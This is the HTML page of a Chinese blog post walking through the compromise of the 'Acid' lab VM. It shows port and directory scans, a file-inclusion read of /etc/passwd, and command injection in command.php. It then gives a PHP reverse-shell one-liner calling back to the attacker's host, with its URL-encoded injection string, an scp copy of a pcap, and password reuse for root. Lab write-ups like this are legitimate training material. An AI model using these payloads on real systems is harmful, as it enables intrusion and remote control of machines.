@@ -1,0 +1,1275 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="靶机渗透," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="信息收集IP：123nmap -sP 192.168.1.0/24    Nmap scan report for acid.lan (192.168.1.138)    Host is up (0.029s latency). 端口：​    一开始想到没有禁ping或者其他之类的，就直接用nmap 192.168.1.138，但是显示的是 123456nmap 192.168.1.138">
+<meta name="keywords" content="靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机渗透_acid">
+<meta property="og:url" content="http://eagerseven.cn/2018/12/31/靶机渗透-acid/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="信息收集IP：123nmap -sP 192.168.1.0/24    Nmap scan report for acid.lan (192.168.1.138)    Host is up (0.029s latency). 端口：​    一开始想到没有禁ping或者其他之类的，就直接用nmap 192.168.1.138，但是显示的是 123456nmap 192.168.1.138">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfp9288phj30u20b8wpf.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwgy1fwfpfbngqlg307f08h0su.gif">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfvyok8bpj30uu0gkgql.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfvzjegdcj30z00fsjwo.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwfw0q4e0vj310u0m8ah1.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwfqeyi9qyj312q0f2dgz.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfwl9mdd7j30zi0m6tff.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwgy1fwfx58r9taj310m0lc7bd.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfxaqp6f5j30qq0akjt3.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfylxbvx5j30lm028dg5.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwg0j9f5cej30zw0wm18p.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwfzaxg2utj30uk034759.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwfydwwfxtj30aw042jsd.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwfz8lsvd5j30o203qwg2.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwgy1fwfzglss2oj31kw03cgpl.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfzzza433j30w402ygnq.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwg0lmi038j316k0z20za.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwg0prab7uj30nc0akad5.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwg0ral763j30v40amgo6.jpg">
+<meta property="og:updated_time" content="2018-12-31T08:12:14.150Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="靶机渗透_acid">
+<meta name="twitter:description" content="信息收集IP：123nmap -sP 192.168.1.0/24    Nmap scan report for acid.lan (192.168.1.138)    Host is up (0.029s latency). 端口：​    一开始想到没有禁ping或者其他之类的，就直接用nmap 192.168.1.138，但是显示的是 123456nmap 192.168.1.138">
+<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfp9288phj30u20b8wpf.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/12/31/靶机渗透-acid/"/>
+
+
+
+
+
+  <title>靶机渗透_acid | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/12/31/靶机渗透-acid/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">靶机渗透_acid</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-31T16:11:00+08:00">
+                2018-12-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1,611
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="IP："><a href="#IP：" class="headerlink" title="IP："></a>IP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.1.0/24</span><br><span class="line">    Nmap scan report for acid.lan (192.168.1.138)</span><br><span class="line">    Host is up (0.029s latency).</span><br></pre></td></tr></table></figure>
+<h4 id="端口："><a href="#端口：" class="headerlink" title="端口："></a>端口：</h4><p>​    一开始想到没有禁ping或者其他之类的，就直接用nmap 192.168.1.138，但是显示的是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.138</span><br><span class="line">    Nmap scan report for acid.lan (192.168.1.138)</span><br><span class="line">    Host is up (0.0080s latency).</span><br><span class="line">    All 1000 scanned ports on acid.lan (192.168.1.138) are closed</span><br><span class="line"></span><br><span class="line">    Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds</span><br></pre></td></tr></table></figure>
+<p>​    不应该呀，所有端口都关了还玩个屁，默认只扫描1000个，那我们全部扫描试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.138 -p 1-65535</span><br><span class="line">	Nmap scan report for acid.lan (192.168.1.138)</span><br><span class="line">    Host is up (0.018s latency).</span><br><span class="line">    Not shown: 65534 closed ports</span><br><span class="line">    PORT      STATE SERVICE</span><br><span class="line">    33447/tcp open  unknown</span><br></pre></td></tr></table></figure>
+<p>​    可以看到存在一个端口</p>
+<h4 id="服务器："><a href="#服务器：" class="headerlink" title="服务器："></a>服务器：</h4><p>​    虽然打开虚拟机的时候就知道是ubuntu了，但是还是要流程走一遍啊</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.138</span><br><span class="line">    Nmap scan report for acid.lan (192.168.1.138)</span><br><span class="line">    Host is up (0.0027s latency).</span><br><span class="line">    Not shown: 65534 closed ports</span><br><span class="line">    PORT      STATE SERVICE VERSION</span><br><span class="line">    33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+<h4 id="目录："><a href="#目录：" class="headerlink" title="目录："></a>目录：</h4><p>​    扫描一波目录，看会不会有信息泄漏</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python webdirscan.py http://192.168.1.138:33447/</span><br><span class="line">	/Challenge</span><br><span class="line">		cake.php</span><br><span class="line">		include.php</span><br><span class="line">		hacked.php</span><br></pre></td></tr></table></figure>
+<p>因为这是靶机，至于什么子域名啊whois信息啊之类的就免了</p>
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><h4 id="1、图片"><a href="#1、图片" class="headerlink" title="1、图片"></a>1、图片</h4><p>在信息收集中我们可以看到33447端口开放的是一个apache web服务，访问一下有提示信息需要一个secret keys</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfp9288phj30u20b8wpf.jpg" alt=""></p>
+<p>右键源码可以看到一串16进制的字符串，解码得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d293LmpwZw==</span><br></pre></td></tr></table></figure>
+<p>再base64解码看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wow.jpg</span><br></pre></td></tr></table></figure>
+<p>访问显示404，看来是路径不对，再看看源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">html &#123; </span><br><span class="line">			background: url(images/bg.jpg) no-repeat center center fixed; </span><br><span class="line">			-webkit-background-size: cover;</span><br><span class="line">			-moz-background-size: cover;</span><br><span class="line">			-o-background-size: cover;</span><br><span class="line">			background-size: cover;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到有一个images目录，加入路径访问得到一张图片</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fwfpfbngqlg307f08h0su.gif" alt=""></p>
+<p>但是后续不知道该怎么办了，因为可用的点实在太少了，难道就是从图片入手？</p>
+<h4 id="2、cake-php"><a href="#2、cake-php" class="headerlink" title="2、cake.php"></a>2、cake.php</h4><p>访问得到</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfvyok8bpj30uu0gkgql.jpg" alt=""></p>
+<p>看来不能直接利用，但是网站标题变成了<code>/Magic_Box</code></p>
+<p>访问是403</p>
+<h4 id="3、include-php"><a href="#3、include-php" class="headerlink" title="3、include.php"></a>3、include.php</h4><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfvzjegdcj30z00fsjwo.jpg" alt=""></p>
+<p>访问没有权限，但是尝试包含，发现存在漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.138:33447/Challenge/include.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<h4 id="4、hacked-php"><a href="#4、hacked-php" class="headerlink" title="4、hacked.php"></a>4、hacked.php</h4><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwfw0q4e0vj310u0m8ah1.jpg" alt=""></p>
+<p>看来有戏，估计是一个后门</p>
+<p>输入长度限制在20个字符，常规的sql注入和xss都试了下不行</p>
+<h4 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h4><p>有一个成功的图片，有一个后门，有一个文件包含漏洞，有一个403的路径/Magic_Box，看来要在图片上做文章</p>
+<p>试了常规隐写，发现用ihex打开时，在文件末尾有一串ascii字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34</span><br></pre></td></tr></table></figure>
+<p>ascii解码得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7aee0f6d588ed9905ee37f16a7c610d4</span><br></pre></td></tr></table></figure>
+<p>应该是一串32位 md5</p>
+<p>去解密试试</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwfqeyi9qyj312q0f2dgz.jpg" alt=""></p>
+<p>这应该就是前面所提示的secret keys，这个会不会就是后门密码</p>
+<p>输入还是一样的页面</p>
+<h4 id="不是转机的转机"><a href="#不是转机的转机" class="headerlink" title="不是转机的转机"></a>不是转机的转机</h4><p>后面测试再访问include.php时，显示了不同的页面</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfwl9mdd7j30zi0m6tff.jpg" alt=""></p>
+<p>猜测是前面在hacked.php输入了secret keys的原因</p>
+<p>但是还是只能包含文件，和之前没啥区别，包含下已知的三个PHP文件试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hacked.php:</span><br><span class="line">	0x5933566a4c6e4a34626e413d</span><br><span class="line">cake.php:</span><br><span class="line">	0x5933566a4c6e4a34626e413d</span><br><span class="line">include.php:</span><br><span class="line">	是空的</span><br></pre></td></tr></table></figure>
+<p>解码后为<code>cuc.rxnp</code>，这个不是路径，也不是hacked.php的id</p>
+<p>陷入了江局</p>
+<h4 id="真正的转机"><a href="#真正的转机" class="headerlink" title="真正的转机"></a>真正的转机</h4><p>回忆起之前扫出的<code>Magic_Box</code>目录访问是403，当时没当回事，尝试扫下文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">low.php</span><br><span class="line">command.php</span><br></pre></td></tr></table></figure>
+<p>访问low.php是空白，访问command.php有东西</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fwfx58r9taj310m0lc7bd.jpg" alt=""></p>
+<p>这种在以前的ctf中遇到过，一般考点是任意命令执行，构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfxaqp6f5j30qq0akjt3.jpg" alt=""></p>
+<p>还真是</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>写入一句话连接蚁剑翻翻文件吧</p>
+<p>但是没有写入权限，那我们直接反弹shell试试，用bash反弹失败，利用<a href="https://www.leavesongs.com/PHP/backshell-via-php.html" target="_blank" rel="noopener">p神</a>的php反弹成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("192.168.1.179",6789);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+<p>但是这里有个坑，需要url编码一下才行，所以构造的url为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%39%32%2e%31%36%38%2e%31%2e%31%37%39%22%2c%36%37%38%39%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27</span><br></pre></td></tr></table></figure>
+<p>拿到了shell，查看当前用户</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfylxbvx5j30lm028dg5.jpg" alt=""></p>
+<p>查看所有用户</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwg0j9f5cej30zw0wm18p.jpg" alt=""></p>
+<p>查看版本</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwfzaxg2utj30uk034759.jpg" alt=""></p>
+<p>但是没有合适的exp，就算有也不能使用，因为wget命令不能使用，没法下载</p>
+<p>翻文件发现了两个类似邮箱和密码的文件</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwfydwwfxtj30aw042jsd.jpg" alt=""></p>
+<p>想去cake.php登录，发现不行，翻看一些文件的时候发现没有权限，用<code>su</code>命令不行，显示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>
+<p>在<a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal" target="_blank" rel="noopener">stack overflow</a>上找到了一个利用python调用本地/bin/bash的方法</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwfz8lsvd5j30o203qwg2.jpg" alt=""></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>可以使用su命令了，但是切换root用户需要密码，利用之前翻到的邮箱密码不行。有一个sql文件。里面有密码和盐值，但是这么长不知道什么加密，放弃</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fwfzglss2oj31kw03cgpl.jpg" alt=""></p>
+<p>查看history都是自己的命令</p>
+<p>做不下去了，思路没有了，看了下别人的过程，原来是查看用户的文件，找到一个流量包</p>
+<p>找到一个hint.pcapng</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwfzzza433j30w402ygnq.jpg" alt=""></p>
+<p>可以利用如下命令讲其发送到本机，前提是本机要开启ssh服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /sbin/raw_vs_isi/hint.pcapng 用户名@IP:/路径/</span><br></pre></td></tr></table></figure>
+<p>本地利用Wireshark分析</p>
+<p>这个包里有服务器里的一个用户名</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwg0lmi038j316k0z20za.jpg" alt=""></p>
+<p>密码应该就是1337hax0r</p>
+<p>可以成功切换的saman用户</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwg0prab7uj30nc0akad5.jpg" alt=""></p>
+<p>但是可以看到还是不能访问root文件夹，在流量包里也没找到root用户密码，尝试用相同密码到root</p>
+<p>成功提权</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwg0ral763j30v40amgo6.jpg" alt=""></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个环境有点绕，会有很多看似正确的点，其实都是扰乱思路的</p>
+<h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><ul>
+<li>网站右键源码图片隐写拿到一个密码</li>
+<li>扫目录发现/Challenge/cake.php、include.php、hacked.php。Magic_Box/low.php、command.php</li>
+<li>command.php任意命令执行php反弹shell</li>
+<li>用户文件找到hint.pcap数据包拿到root用户密码</li>
+</ul>
+<h4 id="学到的新东西"><a href="#学到的新东西" class="headerlink" title="学到的新东西"></a>学到的新东西</h4><ul>
+<li>PHP反弹shell</li>
+<li>python本地调用/bin/bash</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/靶机渗透/" rel="tag"><i class="fa fa-tag"></i> 靶机渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/31/靶机渗透-rickdicul/" rel="next" title="靶机渗透_rickdicul">
+                <i class="fa fa-chevron-left"></i> 靶机渗透_rickdicul
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/31/靶机渗透-Breach1/" rel="prev" title="靶机渗透_Breach1">
+                靶机渗透_Breach1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
